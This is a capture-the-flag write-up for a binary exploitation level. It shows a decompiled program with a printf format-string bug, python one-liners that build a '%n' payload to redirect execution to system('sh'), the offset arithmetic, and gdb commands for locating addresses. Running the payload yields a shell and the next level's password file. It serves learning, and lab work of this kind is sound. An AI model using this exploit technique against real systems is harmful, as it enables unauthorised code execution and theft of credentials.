# LEVEL 05

* decompile the binary:
    ```c
        int main() {
        char input[100];

        fgets(input, 0x64, stdin);
        ...
        printf(input);
        exit(0);
    }

    ```
    - store string to input from stdin
    - call printf with the input as first parametre
    ___

* prepare:
    the input that we write will be sended to printf so we can exploit tha using `"%n"`
    python -c 'print "\x76\xd6\xff\xff\x74\xd6\xff\xff\x6c\xd6\xff\xff\x6e\xd6\xff\xff"' > input
    python -c 'print "%2036c%10$n%32865c%11$hn%9835c%12$hn%18710c%13$hn"' >> input
    ___

* exec bin: `cat input - | ./level05`
    - got shell prompt
    - cat /home/users/level06/.pass -> flag
    ___

* explanation
    ```
    0xffffd66c -> return address
    0xffffd674 -> system() param address
    0x08048865 -> "sh"
    0xf7e6aed0 -> system() address
    16 -> is the number of caracter writed before %

    0x0804 - 16     == 2036
    0x8865 - 0x0804 == 32865
    0xaed0 - 0x8865  == 9835
    0xf7e6 - 0xaed0 == 18710
    ```
    ___
    
* helper: to find address of a string in the binary using gdb
    https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb

    ```shell
    (gdb) info proc map
    (gdb) find 0x7ffff7a1c000,0x7ffff7bd2000,"sh"
    ```
